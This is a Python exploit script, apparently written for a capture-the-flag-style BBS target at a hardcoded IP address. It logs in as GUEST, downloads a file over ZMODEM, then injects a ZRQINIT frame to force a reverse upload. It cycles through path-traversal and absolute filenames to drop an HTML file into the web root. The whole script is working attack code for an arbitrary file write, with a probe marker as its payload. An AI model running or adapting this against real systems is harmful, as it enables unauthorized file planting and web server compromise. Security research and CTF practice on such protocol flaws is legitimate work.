#!/usr/bin/env python3
"""
ZMODEM reverse upload exploit (Forsberg 1986 §7.5 Session Cleanup).
After normal download completes (ZFIN), inject ZRQINIT to start uploading
a file back to the BBS. If it lands in /var/www/html/, jailHTTPd can serve it.
"""

import os
import select
import socket
import subprocess
import sys
import time
import tempfile

HOST = "23.179.17.92"
BBS_PORT = 2323

# ZMODEM constants
ZPAD = 0x2A      # '*'
ZDLE = 0x18      # CAN
ZHEX = 0x42      # 'B'
ZRQINIT = 0x00   # Request receive init
ZRINIT = 0x01    # Receive init
ZSINIT = 0x02    # Send init
ZACK = 0x03      # ACK
ZFILE = 0x04     # File name
ZSKIP = 0x05     # Skip file
ZNAK = 0x06      # NAK
ZABORT = 0x07    # Abort
ZFIN = 0x08      # Finish session
ZRPOS = 0x09     # Resume position
ZDATA = 0x0A     # Data packet
ZEOF = 0x0B      # End of file
ZFERR = 0x0C     # File error
ZCRC = 0x0D      # CRC request
ZCHALLENGE = 0x0E
ZCOMPL = 0x0F    # Complete
ZCAN = 0x10      # Cancel
ZFREECNT = 0x11  # Free bytes
ZCOMMAND = 0x12  # Command
ZSTDERR = 0x13   # Stderr data

def crc16(data: bytes) -> int:
    """CRC-16-CCITT for ZMODEM hex headers."""
    crc = 0
    for byte in data:
        crc ^= byte << 8
        for _ in range(8):
            if crc & 0x8000:
                crc = (crc << 1) ^ 0x1021
            else:
                crc <<= 1
        crc &= 0xFFFF
    return crc

def hex_header(frame_type: int, flags: bytes = b'\x00\x00\x00\x00') -> bytes:
    """Build a ZMODEM hex header: **BTYPE[4]FLAGS[8]CRC[4]<CR><LF>"""
    hdr = bytes([frame_type]) + flags
    crc = crc16(hdr)
    def to_hex(b: int) -> bytes:
        return f"{b:02x}".encode()
    out = b'**B'
    out += to_hex(frame_type)
    for b in flags:
        out += to_hex(b)
    out += to_hex(crc >> 8)
    out += to_hex(crc & 0xFF)
    out += b'\r\n'
    return out

def zrqinit_header() -> bytes:
    """ZRQINIT header to request receiver mode."""
    return hex_header(ZRQINIT)

def drive_bbs(s: socket.socket, file_num: str = "4", override_pw: str = "x") -> None:
    """Navigate BBS to start ZMODEM download."""
    def recv_drain(sock: socket.socket, max_wait: float = 0.5) -> bytes:
        result = b""
        sock.settimeout(max_wait)
        try:
            while True:
                d = sock.recv(65536)
                if not d:
                    break
                result += d
        except socket.timeout:
            pass
        return result

    s.settimeout(2.0)
    time.sleep(0.5)
    recv_drain(s, 1.0)
    s.sendall(b"GUEST\r\n"); time.sleep(0.4); recv_drain(s, 0.5)
    s.sendall(b"\r\n"); time.sleep(0.4); recv_drain(s, 0.5)
    s.sendall(b"F\r\n"); time.sleep(0.8); recv_drain(s, 0.8)
    s.sendall(b"D\r\n"); time.sleep(0.5); recv_drain(s, 0.5)
    s.sendall(file_num.encode() + b"\r\n"); time.sleep(0.6); recv_drain(s, 0.6)
    if "4" in file_num.split():
        s.sendall(override_pw.encode() + b"\r\n")
        time.sleep(0.2)

def receive_with_rz(s: socket.socket, out_dir: str, idle_timeout: float = 6.0) -> bool:
    """Run rz to complete download. Returns True if ZFIN was received."""
    os.makedirs(out_dir, exist_ok=True)
    rz = subprocess.Popen(
        ["rz", "-y", "--disable-timeout"],
        cwd=out_dir,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    s.setblocking(False)

    all_data = b""
    last_activity = time.time()
    try:
        while rz.poll() is None:
            fds = [s, rz.stdout]
            rlist, _, _ = select.select(fds, [], [], 1.0)
            if not rlist and time.time() - last_activity > idle_timeout:
                break
            if s in rlist:
                try:
                    data = s.recv(65536)
                except BlockingIOError:
                    data = b""
                if data == b"":
                    break
                all_data += data
                rz.stdin.write(data)
                rz.stdin.flush()
                last_activity = time.time()
            if rz.stdout in rlist:
                data = rz.stdout.read1(65536)
                if not data:
                    break
                s.sendall(data)
                last_activity = time.time()
    finally:
        try:
            rz.stdin.close()
        except Exception:
            pass
        try:
            rz.terminate()
        except Exception:
            pass

    # Check if ZFIN was in the stream
    zfin_pattern = b'**B08'  # Hex header for ZFIN (type 08)
    return zfin_pattern in all_data or b'\x18B08' in all_data

def attempt_reverse_upload(s: socket.socket, filename: str, content: bytes) -> bool:
    """After ZFIN, try to send ZRQINIT and upload a file."""
    s.setblocking(False)

    # Create temp file for sz
    with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.tmp') as f:
        f.write(content)
        tmppath = f.name

    try:
        print(f"[*] Sending ZRQINIT to initiate reverse upload...")
        s.setblocking(True)
        s.settimeout(2.0)

        # Send ZRQINIT
        zrqinit = zrqinit_header()
        print(f"[*] ZRQINIT: {zrqinit!r}")
        s.sendall(zrqinit)

        # Wait for response
        time.sleep(0.5)
        s.setblocking(False)
        response = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
        except BlockingIOError:
            pass

        print(f"[*] Response after ZRQINIT: {response!r}")

        if not response:
            print("[-] No response to ZRQINIT")
            return False

        # Look for ZRINIT (server ready to receive)
        if b'**B01' in response or b'\x18B01' in response:
            print("[+] Got ZRINIT! Server accepts upload.")

            # Now use sz to upload
            print(f"[*] Uploading as filename: {filename}")
            sz = subprocess.Popen(
                ["sz", "-b", "-e", "--rename", tmppath],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                env={**os.environ, "ZMODEM_FILENAME": filename}
            )

            s.setblocking(False)
            last_activity = time.time()

            while sz.poll() is None:
                fds = [s, sz.stdout]
                rlist, _, _ = select.select(fds, [], [], 1.0)
                if not rlist and time.time() - last_activity > 6.0:
                    break
                if s in rlist:
                    try:
                        data = s.recv(65536)
                    except BlockingIOError:
                        data = b""
                    if data:
                        sz.stdin.write(data)
                        sz.stdin.flush()
                        last_activity = time.time()
                if sz.stdout in rlist:
                    data = sz.stdout.read1(65536)
                    if data:
                        s.sendall(data)
                        last_activity = time.time()

            sz.terminate()
            err = sz.stderr.read().decode('utf-8', 'replace')
            if err:
                print(f"[sz stderr] {err}")
            return True
        else:
            print(f"[-] No ZRINIT in response")
            return False

    finally:
        os.unlink(tmppath)

def main():
    out_dir = "/tmp/zmodem_reverse_test"
    os.makedirs(out_dir, exist_ok=True)

    print(f"[*] Connecting to {HOST}:{BBS_PORT}")
    s = socket.socket()
    s.settimeout(10)
    s.connect((HOST, BBS_PORT))

    try:
        # Step 1: Navigate to download
        print("[*] Navigating BBS menu...")
        drive_bbs(s, "4", "x")

        # Step 2: Complete download with rz
        print("[*] Starting ZMODEM receive...")
        got_zfin = receive_with_rz(s, out_dir)
        print(f"[*] Download complete. ZFIN detected: {got_zfin}")

        # List downloaded files
        for f in os.listdir(out_dir):
            print(f"    {f} ({os.path.getsize(os.path.join(out_dir, f))} bytes)")

        # Step 3: Attempt reverse upload
        print("\n[*] Attempting ZMODEM reverse upload (Forsberg §7.5)...")

        # Test payload with marker
        marker = f"PROBE_{int(time.time())}"
        content = f"<html><body>{marker}</body></html>".encode()

        # Try different filenames
        filenames_to_try = [
            "probe.html",                    # Simple
            "../../../var/www/html/probe.html",  # Traversal
            "../../html/probe.html",
            "/var/www/html/probe.html",      # Absolute
        ]

        for fname in filenames_to_try:
            print(f"\n[*] Trying filename: {fname}")
            # Reconnect for each attempt
            s.close()
            s = socket.socket()
            s.settimeout(10)
            s.connect((HOST, BBS_PORT))
            drive_bbs(s, "4", "x")
            receive_with_rz(s, out_dir)

            if attempt_reverse_upload(s, fname, content):
                print(f"[+] Upload attempt completed for {fname}")
            else:
                print(f"[-] Upload failed for {fname}")

    finally:
        s.close()

if __name__ == "__main__":
    main()
